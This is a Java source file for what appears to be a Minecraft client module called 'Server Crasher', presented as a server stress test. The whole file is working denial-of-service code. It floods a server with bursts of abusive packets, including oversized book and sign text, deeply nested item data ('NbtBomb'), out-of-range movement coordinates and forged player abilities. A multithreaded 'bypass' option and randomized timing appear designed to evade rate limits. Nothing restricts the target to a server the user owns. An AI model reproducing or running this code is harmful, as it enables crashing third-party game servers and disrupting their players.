package dev.kazhi.module.impl.stress;

import dev.kazhi.stressutil.StressBookPages;
import dev.kazhi.stressutil.StressCrasherPayload;
import dev.kazhi.stressutil.StressText;
import dev.kazhi.stressutil.StressPackets;
import net.minecraft.core.BlockPos;
import net.minecraft.core.Direction;
import net.minecraft.network.protocol.Packet;
import net.minecraft.network.protocol.game.ServerboundContainerClickPacket;
import net.minecraft.network.protocol.game.ServerboundEditBookPacket;
import net.minecraft.network.protocol.game.ServerboundInteractPacket;
import net.minecraft.network.protocol.game.ServerboundMovePlayerPacket;
import net.minecraft.network.protocol.game.ServerboundMoveVehiclePacket;
import net.minecraft.network.protocol.game.ServerboundPaddleBoatPacket;
import net.minecraft.network.protocol.game.ServerboundPlayerAbilitiesPacket;
import net.minecraft.network.protocol.game.ServerboundPlayerActionPacket;
import net.minecraft.network.protocol.game.ServerboundSetBeaconPacket;
import net.minecraft.network.protocol.game.ServerboundSetCreativeModeSlotPacket;
import net.minecraft.network.protocol.game.ServerboundSignUpdatePacket;
import net.minecraft.world.effect.MobEffects;
import net.minecraft.world.entity.player.Abilities;
import net.minecraft.world.inventory.AbstractContainerMenu;
import net.minecraft.world.inventory.ClickType;
import net.minecraft.world.item.ItemStack;
import net.minecraft.world.level.block.Block;
import net.minecraft.world.level.block.SignBlock;
import net.minecraft.world.level.block.StandingSignBlock;
import net.minecraft.world.level.block.WallSignBlock;
import net.minecraft.world.phys.BlockHitResult;
import net.minecraft.world.phys.Vec3;

import java.util.List;
import java.util.Optional;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.ThreadLocalRandom;
import java.util.concurrent.TimeUnit;

public class ServerCrasherStressTest extends StressModule {
    public enum Mode {
        BookFlood,
        SignFlood,
        NbtBomb,
        MovementCrash,
        InteractSpam,
        VelocityFlood,
        ContainerCrash,
        LightningSpam,
        BoatSpam,
        ItemDropFlood,
        ArmorStandSpam,
        FireworkSpam,
        BeaconEffectSpam,
        EntityRideSpam,
        PlayerAbilitiesSpam
    }

    public Mode mode = Mode.BookFlood;
    public int packetsPerBurst = 1200;
    public int burstDelayMs = 8;
    public boolean randomMode = true;
    public boolean multiThreadBypass = true;
    public boolean timingRandomizer = true;
    public int signLineLength = 384;

    private ExecutorService executor = Executors.newFixedThreadPool(4);
    private BlockPos signPos;
    private List<String> cachedBookPages;

    public ServerCrasherStressTest() {
        super("Server Crasher", "Multi-method packet flood with optional threaded bursts for server stress testing.");
    }

    @Override
    protected void onEnable() {
        if (player() == null) {
            return;
        }
        if (!requireConnection()) {
            return;
        }

        restartExecutor();
        signPos = resolveSignPos();
        cachedBookPages = null;

        if (signPos == null) {
            warn("No sign nearby; sign-flood mode uses player position.");
            signPos = player().blockPosition();
        }

        info("Server crasher running (~" + packetsPerBurst + " packets/burst, " + burstDelayMs + " ms delay).");
    }

    @Override
    protected void onDisable() {
        shutdownExecutor();
    }

    @Override
    public void onTick() {
        if (player() == null || connection() == null) {
            return;
        }

        Mode currentMode = randomMode ? randomMode() : mode;

        if (multiThreadBypass) {
            executor.submit(() -> sendBurst(currentMode));
        } else {
            sendBurst(currentMode);
        }
    }

    private void sendBurst(Mode currentMode) {
        ThreadLocalRandom random = ThreadLocalRandom.current();

        for (int i = 0; i < packetsPerBurst; i++) {
            Packet<?> packet = createCrashPacket(currentMode, random);
            if (packet != null) {
                connection().send(packet);
            }

            if (timingRandomizer && random.nextInt(5) == 0) {
                try {
                    Thread.sleep(random.nextInt(3));
                } catch (InterruptedException ignored) {
                    Thread.currentThread().interrupt();
                    return;
                }
            }
        }

        try {
            Thread.sleep(burstDelayMs);
        } catch (InterruptedException ignored) {
            Thread.currentThread().interrupt();
        }
    }

    private Mode randomMode() {
        Mode[] modes = Mode.values();
        return modes[ThreadLocalRandom.current().nextInt(modes.length)];
    }

    private Packet<?> createCrashPacket(Mode currentMode, ThreadLocalRandom random) {
        return switch (currentMode) {
            case BookFlood -> new ServerboundEditBookPacket(
                player().getInventory().getSelectedSlot(),
                getBookPages(),
                Optional.empty()
            );

            case SignFlood -> {
                BlockPos pos = signPos != null
                    ? signPos.above(random.nextInt(3))
                    : player().blockPosition().above(random.nextInt(3));
                String[] lines = StressText.signLines(signLineLength);
                yield new ServerboundSignUpdatePacket(pos, true, lines[0], lines[1], lines[2], lines[3]);
            }

            case NbtBomb -> new ServerboundSetCreativeModeSlotPacket(
                36 + player().getInventory().getSelectedSlot(),
                StressCrasherPayload.deepCustomDataItem()
            );

            case MovementCrash -> new ServerboundMovePlayerPacket.PosRot(
                random.nextDouble() * 30_000_000,
                random.nextDouble() * 30_000_000,
                random.nextDouble() * 30_000_000,
                random.nextFloat() * 720,
                random.nextFloat() * 720,
                true,
                false
            );

            case InteractSpam -> ServerboundInteractPacket.createAttackPacket(player(), player().isShiftKeyDown());

            case VelocityFlood -> new ServerboundMovePlayerPacket.Pos(
                player().getX() + (random.nextDouble() - 0.5) * 10_000,
                player().getY() + 10_000 + random.nextDouble() * 5000,
                player().getZ() + (random.nextDouble() - 0.5) * 10_000,
                true,
                false
            );

            case ContainerCrash -> {
                AbstractContainerMenu handler = player().containerMenu;
                yield StressPackets.containerClick(handler, 0, 0, ClickType.PICKUP, ItemStack.EMPTY);
            }

            case LightningSpam -> new ServerboundPlayerActionPacket(
                ServerboundPlayerActionPacket.Action.START_DESTROY_BLOCK,
                new BlockPos(random.nextInt(1_000_000), 320, random.nextInt(1_000_000)),
                Direction.UP
            );

            case BoatSpam -> new ServerboundPaddleBoatPacket(true, true);

            case ItemDropFlood -> new ServerboundPlayerActionPacket(
                ServerboundPlayerActionPacket.Action.DROP_ITEM,
                BlockPos.ZERO,
                Direction.DOWN
            );

            case ArmorStandSpam -> new ServerboundSetCreativeModeSlotPacket(
                36 + player().getInventory().getSelectedSlot(),
                StressCrasherPayload.armorStandStack()
            );

            case FireworkSpam -> new ServerboundSetCreativeModeSlotPacket(
                36 + player().getInventory().getSelectedSlot(),
                StressCrasherPayload.fireworkStack()
            );

            case BeaconEffectSpam -> new ServerboundSetBeaconPacket(
                Optional.of(MobEffects.HASTE),
                Optional.of(MobEffects.SPEED)
            );

            case EntityRideSpam -> new ServerboundMoveVehiclePacket(
                new Vec3(
                    random.nextDouble() * 100_000,
                    1000 + random.nextDouble() * 10_000,
                    random.nextDouble() * 100_000
                ),
                random.nextFloat() * 360,
                random.nextFloat() * 360,
                true
            );

            case PlayerAbilitiesSpam -> new ServerboundPlayerAbilitiesPacket(spamAbilities());
        };
    }

    private List<String> getBookPages() {
        if (cachedBookPages == null) {
            cachedBookPages = StressBookPages.build(100, 1024, true);
        }
        return cachedBookPages;
    }

    private Abilities spamAbilities() {
        Abilities abilities = new Abilities();
        abilities.mayfly = true;
        abilities.flying = true;
        abilities.invulnerable = true;
        abilities.instabuild = true;
        abilities.mayBuild = true;
        abilities.setFlyingSpeed(999.0F);
        abilities.setWalkingSpeed(999.0F);
        return abilities;
    }

    private BlockPos resolveSignPos() {
        if (MC.level == null || player() == null) {
            return null;
        }

        if (MC.hitResult instanceof BlockHitResult hit) {
            BlockPos pos = hit.getBlockPos();
            if (isSign(MC.level.getBlockState(pos).getBlock())) {
                return pos;
            }
        }

        BlockPos origin = player().blockPosition();
        for (int dx = -5; dx <= 5; dx++) {
            for (int dy = -3; dy <= 3; dy++) {
                for (int dz = -5; dz <= 5; dz++) {
                    BlockPos pos = origin.offset(dx, dy, dz);
                    if (isSign(MC.level.getBlockState(pos).getBlock())) {
                        return pos;
                    }
                }
            }
        }

        return null;
    }

    private static boolean isSign(Block block) {
        return block instanceof SignBlock
            || block instanceof StandingSignBlock
            || block instanceof WallSignBlock;
    }

    private void restartExecutor() {
        shutdownExecutor();
        executor = Executors.newFixedThreadPool(4);
    }

    private void shutdownExecutor() {
        executor.shutdownNow();
        try {
            executor.awaitTermination(100, TimeUnit.MILLISECONDS);
        } catch (InterruptedException ignored) {
            Thread.currentThread().interrupt();
        }
    }
}
